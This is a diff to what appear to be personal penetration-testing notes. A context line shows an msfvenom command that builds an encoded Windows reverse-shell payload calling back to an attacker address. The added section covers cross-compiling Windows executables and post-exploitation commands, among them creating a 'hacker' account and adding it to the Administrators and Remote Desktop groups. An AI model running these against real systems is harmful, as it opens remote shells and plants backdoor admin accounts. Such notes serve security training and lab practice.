@@ -865,4 +865,53 @@ a option to `msfvenom` to have it exit the thread instead of the progam.
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.134 LPORT=443 EXITFUNC=thread -f c -a x86 --platform=windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
 ```
 
+## Compiling Windows EXE on linux
+
+You can use `i686-w64-mingw32-gcc` to compile a window execuiteable on a linux machine.  You
+can then use `wine` to execute it.
+
+
+
+### Usefull Windows commands
+
+List all users on a windows box
+```
+net users
+```
+
+List specific info about a user
+```
+net user user-name
+```
+
+Add a user
+```
+net user hacker /add
+net user hacker hacked
+```
+
+Add user to the admin group
+```
+net localgroup Administrators hacker /add
+```
+
+Add user to the remote desktop group
+```
+net localgroup "Remote Desktop users" hacker /add
+```
+
+look for running processes
+```
+tasklist
+```
+
+
+Find a file on the system.
+```
+dir c:\ /s /b | find "file.txt"
+```
+* /s - Tells `dir` to do a recursive traversival
+* /b - does a basic printing.
+* find - forceces only printing matiches to the given string.
+
 
